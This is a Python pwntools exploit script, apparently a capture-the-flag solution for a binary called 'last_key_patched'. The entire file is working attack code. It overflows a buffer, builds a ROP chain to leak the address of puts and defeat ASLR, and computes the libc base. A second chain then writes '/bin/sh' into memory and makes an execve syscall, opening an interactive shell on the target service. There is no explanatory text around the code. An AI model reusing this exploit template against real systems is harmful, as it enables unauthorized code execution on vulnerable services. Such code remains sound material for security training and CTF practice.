#!/usr/bin/env python3

from pwn import *

exe = ELF("./last_key_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
rop = ROP(exe)
libcRop = ROP(libc)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("address", 31922)

    return r


def main():
    r = conn()
    r.recvuntil(b'@')
    aa = r.recvline().decode()
    for i in range(aa.index("*")):
        r.sendline(b'r')
    r.sendline(b'r')

    payload = b'a'*0x18
    payload = payload + p64(rop.rdi.address)
    payload += p64(0x403f88)
    payload += p64(0x401100)
    payload += p64(0x401687)
    
    r.sendline(payload)
    r.recvuntil(b'prize')
    r.recvline()
    r.recvline()
    leak = r.recvline()[:-1]
    print(leak)
    leak = leak + (b'\x00' * (8-len(leak)))
    leak = u64(leak)
    base = leak - libc.symbols['puts']
    print(hex(leak))

    payload = b'a'*0x19
    payload += p64(rop.rdi.address)
    #write to 0x404500
    payload += p64(0x404500)
    payload += p64(libcRop.rcx.address + base)
    payload += b'/bin/sh\x00'
    payload += p64(0xbfcf6 + base)
    payload += p64(libcRop.rax.address + base)
    payload += p64(0x3b)
    payload += p64(libcRop.rsi.address + base)
    payload += p64(0x0)
    payload += p64(libcRop.rdx.address + base)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(libcRop.syscall.address + base)
    pause()
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
